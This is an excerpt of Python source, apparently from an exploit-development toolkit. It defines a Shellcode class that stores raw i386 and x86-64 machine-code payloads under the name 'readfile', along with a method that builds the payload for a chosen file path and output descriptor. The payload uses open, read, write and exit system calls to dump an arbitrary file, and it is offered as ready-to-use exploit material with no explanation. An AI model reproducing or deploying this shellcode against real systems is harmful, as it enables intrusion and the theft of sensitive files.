...
class Shellcode:
    _database = {
        'i386': {
            ...
            'readfile': '\xeb\x2f\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xff\x31\xc9\x8d\x47\x05\xcd\x80\x93\x91\x8d\x57\x01\xc1\xe2\x10\x8d\x47\x03\xcd\x80\x92\x8d\x5f${fd}\x8d\x47\x04\xcd\x80\x31\xdb\x8d\x47\x01\xcd\x80\xe8\xcc\xff\xff\xff',
        ...
        'x86-64': {
            ...
            'readfile': '\xeb\x37\x5f\x48\x31\xc9\x8a\x0f\x48\xff\xc7\x88\x2c\x0f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x48\x97\x48\x96\x6a\x01\x5a\x48\xc1\xe2\x10\x48\x31\xc0\x0f\x05\x48\x92\x6a${fd}\x5f\x48\xc1\xe8\x10\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xc4\xff\xff\xff',
    ...
    def readfile(self, path, fd=1):
        return self._database[self.arch]['readfile'].replace('${fd}', chr(fd)) + chr(len(path)) + path
